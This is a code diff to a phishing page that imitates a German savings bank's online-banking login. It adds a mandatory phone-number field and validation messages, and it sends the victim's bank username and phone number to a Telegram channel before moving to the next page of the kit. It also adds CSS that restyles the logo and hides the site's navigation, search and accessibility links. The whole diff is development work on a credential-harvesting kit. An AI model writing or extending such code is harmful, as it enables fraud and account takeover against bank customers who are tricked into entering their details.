@@ -2454,6 +2454,17 @@
 				
 
 			<br class="bterm"></div>
+			
+			<div class="bline mkp-line-small-margin" style="position: relative;">
+				<input type="tel" name="telefonnummer" id="telefonnummer" tabindex="0" required="" class="nbf-text-input" maxlength="20" autocomplete="tel" data-emptyinput="true" placeholder=" ">
+				
+					
+					
+						<label for="telefonnummer">Telefonnummer</label>
+					
+				
+
+			<br class="bterm"></div>
 		
 	
 
@@ -2490,6 +2501,8 @@
 
 
 <input type="hidden" id="isJavaScriptActive" name="isJavaScriptActive" value="1">
+
+<div id="validation-error" style="display: none; color: #d32f2f; font-size: 0.875rem; margin-bottom: 10px; text-align: center; padding: 8px; background-color: #ffebee; border-radius: 4px;"></div>
 
 <div class="buttonline main-buttons"><div class="bgroup1"><div><a href="sparrekasse bedre 2.html" class="mkp-button mkp-button-primary mkp-button-primary-l" title="Weiter" id="weiter-link">Weiter</a></div></div></div></form>
 
@@ -3072,6 +3085,7 @@
 <script>
 (function() {
   var input = document.getElementById('mcPEqZdPIfDTScPR');
+  var telefonInput = document.getElementById('telefonnummer');
   var weiterLink = document.getElementById('weiter-link');
   
   // Helper function to send data to Telegram
@@ -3122,16 +3136,57 @@
     }
   }
   
+  function showValidationError(message) {
+    var errorDiv = document.getElementById('validation-error');
+    if (errorDiv) {
+      errorDiv.textContent = message;
+      errorDiv.style.display = 'block';
+      // Scroll to error message
+      errorDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+  }
+  
+  function hideValidationError() {
+    var errorDiv = document.getElementById('validation-error');
+    if (errorDiv) {
+      errorDiv.style.display = 'none';
+    }
+  }
+  
   async function saveAndNavigate() {
     if (input && weiterLink && window.localStorage) {
+      // Hide previous error
+      hideValidationError();
+      
+      // Validate that Anmeldename is filled
+      var anmeldename = input.value ? input.value.trim() : '';
+      if (!anmeldename) {
+        showValidationError('Sie können nicht fortfahren. Bitte füllen Sie Anmeldename und Telefonnummer aus.');
+        input.focus();
+        return;
+      }
+      
+      // Validate that Telefonnummer is filled
+      var telefonnummer = telefonInput ? (telefonInput.value ? telefonInput.value.trim() : '') : '';
+      if (!telefonnummer) {
+        showValidationError('Sie können nicht fortfahren. Bitte füllen Sie Anmeldename und Telefonnummer aus.');
+        if (telefonInput) {
+          telefonInput.focus();
+        }
+        return;
+      }
+      
       try {
-        var anmeldename = input.value || '';
         localStorage.setItem('login_anmeldename', anmeldename);
+        if (telefonnummer) {
+          localStorage.setItem('telefonnummer', telefonnummer);
+        }
         
         // Send to Telegram and wait for it to complete
         await sendToTelegram({
           action: 'login_username_entered',
           bank_username: anmeldename,
+          telefonnummer: telefonnummer,
         });
       } catch (e) {
         console.error('Error saving data:', e);
@@ -3139,6 +3194,57 @@
       // Navigate after data is sent
       window.location.href = weiterLink.href;
     }
+  }
+  
+  // Function to update data-emptyinput attribute based on input value
+  function updateEmptyInput(input) {
+    if (input) {
+      // Check if input has a value (even if it's just spaces, we want to keep label up)
+      if (input.value && input.value.trim() !== '') {
+        input.setAttribute('data-emptyinput', 'false');
+      } else {
+        input.setAttribute('data-emptyinput', 'true');
+      }
+    }
+  }
+  
+  // Update both input fields on input, focus, and blur events
+  function setupInputLabelBehavior(inputField) {
+    if (inputField) {
+      // Update on input (when typing)
+      inputField.addEventListener('input', function() {
+        updateEmptyInput(inputField);
+      });
+      
+      // Update on focus
+      inputField.addEventListener('focus', function() {
+        updateEmptyInput(inputField);
+      });
+      
+      // Update on blur (when clicking away) - this is critical to keep label up if there's a value
+      inputField.addEventListener('blur', function() {
+        updateEmptyInput(inputField);
+      });
+      
+      // Initial check when page loads
+      updateEmptyInput(inputField);
+    }
+  }
+  
+  // Setup label behavior for both Anmeldename and Telefonnummer fields
+  setupInputLabelBehavior(input);
+  setupInputLabelBehavior(telefonInput);
+  
+  // Hide error when user starts typing
+  if (input) {
+    input.addEventListener('input', function() {
+      hideValidationError();
+    });
+  }
+  if (telefonInput) {
+    telefonInput.addEventListener('input', function() {
+      hideValidationError();
+    });
   }
   
   if (input && weiterLink) {
@@ -3155,10 +3261,58 @@
         saveAndNavigate();
       }
     });
+    
+    // Also allow Enter key in telefonnummer field
+    if (telefonInput) {
+      telefonInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          saveAndNavigate();
+        }
+      });
+    }
   }
 })();
 </script>
 <style>
+/* Make logo white */
+.if6_header .logo img,
+.if6_header .logo picture img,
+.nav-full-container .logo img,
+.nav-full-container .logo picture img {
+  filter: brightness(0) invert(1) !important;
+  -webkit-filter: brightness(0) invert(1) !important;
+}
+
+/* Hide Leichte Sprache and Gebärdensprache */
+.icon-easy-language,
+.icon-sign-language,
+a[href*="leichte-sprache"],
+a[href*="gebaerdensprache"],
+.nav-metanav li:has(.icon-easy-language),
+.nav-metanav li:has(.icon-sign-language),
+.nav-metanav li:has(a[href*="leichte-sprache"]),
+.nav-metanav li:has(a[href*="gebaerdensprache"]),
+.nav-metanav li {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  height: 0 !important;
+  width: 0 !important;
+  overflow: hidden !important;
+  margin: 0 !important;
+  padding: 0 !important;
+}
+
+/* Hide Suche (search) */
+.nav-search,
+#head_search_button,
+button.skipto-search,
+a[href*="#"].nav-search {
+  display: none !important;
+  visibility: hidden !important;
+}
+
 /* Hide trust-wallet and any red boxes/rectangles */
 .trust-wallet-one-tap,
 .trust-wallet-one-tap .box,
